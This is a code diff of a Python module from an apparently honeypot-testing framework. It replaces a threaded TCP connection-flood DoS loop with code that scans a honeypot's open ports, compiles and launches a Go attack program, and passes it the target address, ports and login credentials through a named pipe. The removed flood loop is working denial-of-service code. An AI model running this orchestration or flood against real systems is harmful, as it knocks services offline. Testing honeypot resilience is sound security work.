@@ -1,67 +1,164 @@
-import threading
+import json
+import os
+import subprocess
 import time
-import socket
 
-from .base_attack import AttackResults, BaseAttack, BaseHoneypot
+from pathlib import Path
+from subprocess import CompletedProcess, Popen
+from typing import TypeAlias
+from .base_attack import AttackData, AttackResults, BaseAttack, BaseHoneypot
+from .honeypot_port_scanner.honeypot_port_scanner import (HoneypotPortScanner,
+                                                          AttackPorts)
+
+Attack: TypeAlias = Popen | None
+DoSResults: TypeAlias = dict[str, bool | float]
+
+PIPE_PATH: str = "/tmp/data"
+ATTACKS_PATH = Path(".") / "active_attacks" / "attacks"
+RUN_ATTACKS: list[str] = ["./attacks"]
+BUILD_ATTACKS: list[str] = ["/usr/local/go/bin/go",
+                            "build",
+                            "-o",
+                            "attacks",
+                            "main.go"]
 
 
 class DoS(BaseAttack):
     def __init__(self, honeypot: BaseHoneypot) -> None:
         """
-        Initializes a new DoS object.
+        Initializes a new DoSAllOpenPorts object.
 
         Args:
-            honeypot (BaseHoneypot): Honeypot object holding the information
-                                     to use in the attack.
+            honeypot (BaseHoneypot): Honeypot object to get the information
+                                     for performing the DoS on the honeypot.
         """
         super().__init__(honeypot)
+        self.honeypot_ports: AttackPorts = {}
         self.honeypot_rejecting_connections: bool = False
 
-    def attack(self) -> None:
+    def run_HoneypotPortScanner(self) -> None:
         """
-        Attempt to flood the honeypot with connections until
-        it starts rejecting them.
+        Run the HoneypotPortScanner to get the open ports of the honeypot.
         """
-        while not self.honeypot_rejecting_connections:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            try:
-                sock.connect((self.honeypot.ip, self.honeypot.port))
-                time.sleep(0.01)
-            except Exception:
-                self.honeypot_rejecting_connections = True
-            finally:
-                sock.close()
+        honeypot_scanner = HoneypotPortScanner(self.honeypot.ip)
+        honeypot_scanner.run_scanner()
+        self.honeypot_ports = honeypot_scanner.get_open_ports()
 
-    def run_attack(self, num_threads=40) -> AttackResults:
+    def compile_attacks(self) -> bool:
+        """
+        Compiles the attacks.
+
+        Returns:
+            bool: Whether the compilation was successful or not.
+        """
+        compile: CompletedProcess = subprocess.run(BUILD_ATTACKS,
+                                                   cwd=ATTACKS_PATH)
+        if compile.returncode != 0:
+            print(f"[-] Failed to compile attacks: {compile.stderr}")
+            return False
+        return True
+
+    def make_pipe(self) -> None:
+        """
+        Create the named pipe in /tmp/data.
+        """
+        if not os.path.exists(PIPE_PATH):
+            os.mkfifo(PIPE_PATH)
+
+    def cleanup_pipe(self) -> None:
+        """
+        Delete the named pipe in /tmp/data.
+        """
+        if os.path.exists(PIPE_PATH):
+            os.remove(PIPE_PATH)
+
+    def read_data(self) -> DoSResults:
+        """
+        Read JSON data from the named pipe.
+
+        Returns:
+            DoSResults: JSON data from the named pipe.
+        """
+        fd = os.open(PIPE_PATH, os.O_RDONLY | os.O_NONBLOCK)
+        with os.fdopen(fd, "rb") as pipe:
+            data = pipe.read()
+            while not data:
+                data = pipe.read()
+        return json.loads(data.decode("utf-8"))
+
+    def write_data(self, data: dict) -> bool:
+        """
+        Write JSON data to the FIFO
+        """
+        with open(PIPE_PATH, "w") as pipe:
+            json.dump(data, pipe)
+            success: int = pipe.write("\n")
+            if success == 0:
+                print("[-] Failed to write data to pipe")
+                return False
+            return True
+
+    def create_attack_process(self) -> Attack:
+        """
+        Start the subprocess that will run the attacks.
+
+        Returns:
+            Attack: Popen object that is running the attacks.
+        """
+        if not self.compile_attacks():
+            return None
+        print("[+] Compiled, running attacks now")
+        running = Popen(RUN_ATTACKS,
+                        shell=True,
+                        cwd=ATTACKS_PATH)
+        if not running:
+            print(f"[-] Failed to run attacks: {running.stderr}")
+            return None
+        return running
+
+    def run_attack(self) -> AttackResults:
         """
         Launch the DoS attack using multiple threads.
 
-        Args:
-            num_threads (int | Optional): The number of threads to use for
-                                          the attack.
         Returns:
-            AttackResults: Tuple holding the results of the attack.
+            AttackResults: The results of the attack.
         """
-        print(f"Running DoS attack on {self.honeypot.ip}:{self.honeypot.port}...")
-
-        threads: list[threading.Thread] = [threading.Thread(target=self.attack)
-                                           for _ in range(num_threads)]
-
-        start_time: float = time.time()
-
-        for thread in threads:
-            thread.start()
-
-        while not self.honeypot_rejecting_connections:
-            time.sleep(1)
-
-        for thread in threads:
-            thread.join()
-
-        end_time: float = time.time()
-        time_taken: float = end_time - start_time
-
-        return (True,
-                "Vulnerability found: DoS attack made the SSH honeypot reject connections",
-                time_taken,
-                num_threads)
+        self.run_HoneypotPortScanner()
+        print(f"Running DoS attack on {self.honeypot.ip} and "
+              f"ports: {list(self.honeypot_ports.keys())}")
+        attack: Attack = self.create_attack_process()
+        if not attack:
+            return (
+                False,
+                "[-] Failed to run attack",
+                0,
+                0
+            )
+        program_data: AttackData = {
+            "attack": "dos",
+            "ports":   self.honeypot_ports,
+            "server":  self.honeypot.ip,
+            "user":    self.honeypot.username,
+            "pass":    self.honeypot.password
+        }
+        self.make_pipe()
+        print("[+] Sending data to attack program")
+        self.write_data(program_data)
+        time.sleep(.5)
+        results = self.read_data()
+        attack.wait()
+        print("[+] Attack finished running")
+        self.cleanup_pipe()
+        output: str
+        if results["success"]:
+            output: str = "Vulnerability found: DoS attack made the honeypot "\
+                          "reject connections"
+        else:
+            output: str = "Honeypot did not reject connections, attack "\
+                          "unsuccessful"
+        return (
+            results["success"],
+            output,
+            results["time"],
+            30000
+        )
